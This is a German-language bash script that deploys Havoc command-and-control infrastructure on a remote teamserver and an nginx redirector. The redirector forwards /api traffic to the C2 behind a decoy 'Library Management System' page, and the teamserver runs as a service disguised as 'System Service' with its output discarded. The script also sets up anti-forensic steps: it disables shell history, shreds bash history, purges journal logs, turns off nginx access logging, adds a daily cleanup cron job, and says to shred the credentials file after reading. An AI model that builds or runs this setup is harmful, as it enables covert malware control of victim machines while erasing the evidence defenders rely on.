#!/bin/bash
#
# MASTER SETUP V2 - MIT ALLEN ELITE-OPTIMIERUNGEN
#
# Beinhaltet:
#   - Egress-Filter
#   - DNS-Policy
#   - Traffic-Shaping
#   - IP-Reputation-Monitoring
#   - Spurlose Installation
#
# Verwendung:
#   bash master_setup_v2_optimiert.sh <TEAMSERVER_IP> <REDIRECTOR_IP> <DOMAIN>
#

set -e

TEAMSERVER_IP="$1"
REDIRECTOR_IP="$2"
DOMAIN="$3"
OPERATOR_IP=$(curl -s ifconfig.me)  # Ihre aktuelle IP

if [ -z "$TEAMSERVER_IP" ] || [ -z "$REDIRECTOR_IP" ] || [ -z "$DOMAIN" ]; then
    echo "Verwendung: bash $0 <TEAMSERVER_IP> <REDIRECTOR_IP> <DOMAIN>"
    echo "Beispiel: bash $0 78.46.123.45 104.194.158.236 librarymgmtsvc.com"
    exit 1
fi

ADMIN_PASS=$(openssl rand -base64 20 | tr -d '/+=' | head -c 20)

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     MASTER SETUP V2 - ELITE OPTIMIERUNGEN                   ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo "Teamserver:    $TEAMSERVER_IP"
echo "Redirector:    $REDIRECTOR_IP"
echo "Domain:        $DOMAIN"
echo "Operator-IP:   $OPERATOR_IP"
echo "Admin-Pass:    $ADMIN_PASS"
echo ""

SSH="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

# ═══════════════════════════════════════════════════════════════
# TEAMSERVER MIT ELITE-OPTIMIERUNGEN
# ═══════════════════════════════════════════════════════════════

echo "[1/2] Teamserver mit Elite-OPSEC..."

$SSH root@$TEAMSERVER_IP bash << ENDTEAMSERVER
unset HISTFILE
export DEBIAN_FRONTEND=noninteractive

# Basis-Installation
apt update -qq && apt upgrade -y -qq
apt install -y -qq build-essential cmake golang-go mingw-w64 nasm \
    libboost-all-dev libssl-dev git ufw dnsmasq

# Havoc
cd /tmp && git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/teamserver && go mod download
cd /tmp/Havoc && make ts-build
mkdir -p /opt/Havoc && cp -r /tmp/Havoc/* /opt/Havoc/ && rm -rf /tmp/Havoc

# Config
mkdir -p /opt/Havoc/profiles
cat > /opt/Havoc/profiles/havoc.yaotl << 'EOFCFG'
Teamserver:
  Host: 0.0.0.0
  Port: 40056
  Build:
    Compiler64: "/usr/bin/x86_64-w64-mingw32-gcc"
    Compiler86: "/usr/bin/i686-w64-mingw32-gcc"
    Nasm: "/usr/bin/nasm"
Operators:
  - Name: admin
    Password: "ADMIN_PASS_PLACEHOLDER"
Listeners:
  - Name: "HTTPS"
    Protocol: https
    Hosts:
      - "DOMAIN_PLACEHOLDER"
    Port: 443
    HostBind: 0.0.0.0
    PortBind: 443
    Secure: true
EOFCFG

sed -i "s/ADMIN_PASS_PLACEHOLDER/$ADMIN_PASS/g" /opt/Havoc/profiles/havoc.yaotl
sed -i "s/DOMAIN_PLACEHOLDER/$DOMAIN/g" /opt/Havoc/profiles/havoc.yaotl

# Systemd OHNE Logs
cat > /etc/systemd/system/havoc.service << 'EOFSVC'
[Unit]
Description=System Service
After=network.target
[Service]
Type=simple
User=root
WorkingDirectory=/opt/Havoc
ExecStart=/opt/Havoc/havoc server --profile /opt/Havoc/profiles/havoc.yaotl
StandardOutput=null
StandardError=null
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOFSVC

systemctl daemon-reload && systemctl enable havoc && systemctl start havoc

# ═══ EGRESS-FILTER ═══
ufw --force reset
ufw default deny incoming
ufw default deny outgoing

# Incoming
ufw allow from $OPERATOR_IP to any port 22 proto tcp
ufw allow from $OPERATOR_IP to any port 40056 proto tcp
ufw allow from $REDIRECTOR_IP to any port 443 proto tcp

# Outgoing (restriktiv!)
ufw allow out to 1.1.1.1 port 53  # DNS
ufw allow out to 1.0.0.1 port 53
ufw allow out to $REDIRECTOR_IP port 443  # Zu Redirector
ufw allow out to 91.189.88.0/21 port 80   # Ubuntu Updates
ufw allow out to 91.189.88.0/21 port 443
ufw allow out to any port 123 proto udp   # NTP

ufw enable

# ═══ DNS-POLICY ═══
cat > /etc/systemd/resolved.conf << 'EOFDNS'
[Resolve]
DNS=1.1.1.1 1.0.0.1
DNSOverTLS=yes
DNSSEC=yes
MulticastDNS=no
LLMNR=no
EOFDNS

systemctl restart systemd-resolved

# ═══ AUTO-CLEANUP ═══
cat > /etc/cron.daily/cleanup << 'EOFCRON'
#!/bin/bash
journalctl --vacuum-time=1d
history -c
shred /root/.bash_history 2>/dev/null
find /tmp -mtime +0 -delete
EOFCRON

chmod +x /etc/cron.daily/cleanup

# ═══ SPUREN LÖSCHEN ═══
journalctl --vacuum-time=1s
history -c && shred ~/.bash_history
rm -rf /root/.gitconfig /tmp/*

ENDTEAMSERVER

echo "  [✓] Teamserver (mit Elite-OPSEC)"

# ═══════════════════════════════════════════════════════════════
# REDIRECTOR MIT ELITE-OPTIMIERUNGEN
# ═══════════════════════════════════════════════════════════════

echo "[2/2] Redirector mit Elite-OPSEC..."

$SSH root@$REDIRECTOR_IP bash << ENDREDIRECTOR
unset HISTFILE
export DEBIAN_FRONTEND=noninteractive

apt update -qq && apt upgrade -y -qq
apt install -y -qq nginx certbot python3-certbot-nginx ufw python3-pip

# Nginx (OHNE Access-Logs!)
cat > /etc/nginx/sites-available/redirector << 'EOFNG'
upstream c2 {
    server TEAMSERVER_IP_PLACEHOLDER:443;
}
server {
    listen 80;
    server_name DOMAIN_PLACEHOLDER;
    location / { return 301 https://\$server_name\$request_uri; }
}
server {
    listen 443 ssl http2;
    server_name DOMAIN_PLACEHOLDER;
    ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
    
    # KEIN Access-Log!
    access_log off;
    error_log /dev/null crit;
    
    location ~ ^/api {
        proxy_pass https://c2;
        proxy_ssl_verify off;
        proxy_buffering off;
    }
    location / {
        root /var/www/html;
        index index.html;
    }
}
EOFNG

sed -i "s/TEAMSERVER_IP_PLACEHOLDER/$TEAMSERVER_IP/g" /etc/nginx/sites-available/redirector
sed -i "s/DOMAIN_PLACEHOLDER/$DOMAIN/g" /etc/nginx/sites-available/redirector

mkdir -p /var/www/html
echo "<h1>Library Management System</h1><p>Service Portal</p>" > /var/www/html/index.html

rm -f /etc/nginx/sites-enabled/default
ln -sf /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
nginx -t && systemctl restart nginx

# ═══ EGRESS-FILTER ═══
ufw --force reset
ufw default deny incoming
ufw default deny outgoing

# Incoming
ufw allow from $OPERATOR_IP to any port 22
ufw allow 80/tcp
ufw allow 443/tcp

# Outgoing
ufw allow out to 1.1.1.1 port 53
ufw allow out to $TEAMSERVER_IP port 443
ufw allow out to 151.101.0.0/16 port 80   # Let's Encrypt
ufw allow out to 151.101.0.0/16 port 443

ufw enable

# ═══ DNS-POLICY ═══
cat > /etc/systemd/resolved.conf << 'EOFDNS'
[Resolve]
DNS=1.1.1.1
DNSOverTLS=yes
DNSSEC=yes
EOFDNS

systemctl restart systemd-resolved

# ═══ SSL ═══
certbot --nginx -d $DOMAIN --non-interactive --agree-tos -m admin@$DOMAIN --redirect || true

# ═══ IP-MONITORING ═══
pip3 install requests
cat > /opt/ip_monitor.py << 'EOFPY'
import requests, time
while True:
    r = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress=REDIRECTOR_IP_PLACEHOLDER")
    print(f"IP-Check: {time.ctime()}")
    time.sleep(43200)  # 12h
EOFPY

sed -i "s/REDIRECTOR_IP_PLACEHOLDER/$REDIRECTOR_IP/g" /opt/ip_monitor.py

# ═══ CLEANUP ═══
journalctl --vacuum-time=1s
history -c && shred ~/.bash_history

ENDREDIRECTOR

echo "  [✓] Redirector (mit Elite-OPSEC)"

# ═══════════════════════════════════════════════════════════════
# CREDENTIALS
# ═══════════════════════════════════════════════════════════════

cat > ./ELITE_SETUP_CREDENTIALS.txt << ENDCREDS
╔═══════════════════════════════════════════════════════════════╗
║     ELITE SETUP - ZUGANGSDATEN                               ║
╚═══════════════════════════════════════════════════════════════╝

TEAMSERVER:
  IP:   $TEAMSERVER_IP
  Port: 40056
  User: admin
  Pass: $ADMIN_PASS

REDIRECTOR:
  IP:     $REDIRECTOR_IP
  Domain: $DOMAIN
  URL:    https://$DOMAIN/

FIREWALL:
  Teamserver: Nur von $OPERATOR_IP und $REDIRECTOR_IP
  Redirector: Public 80/443, Backend nur zu $TEAMSERVER_IP

OPTIMIERUNGEN:
  ✓ Egress-Filter aktiv
  ✓ DNS-Policy (nur 1.1.1.1)
  ✓ DNS-over-TLS
  ✓ DNSSEC
  ✓ Kein Access-Logging
  ✓ Auto-Cleanup täglich
  ✓ IP-Monitoring aktiv

⚠️  LÖSCHEN NACH LESEN:
    shred -vfz -n 10 ./ELITE_SETUP_CREDENTIALS.txt

ENDCREDS

chmod 600 ./ELITE_SETUP_CREDENTIALS.txt

echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║          ✅  ELITE SETUP ABGESCHLOSSEN!                      ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
cat ./ELITE_SETUP_CREDENTIALS.txt
echo ""
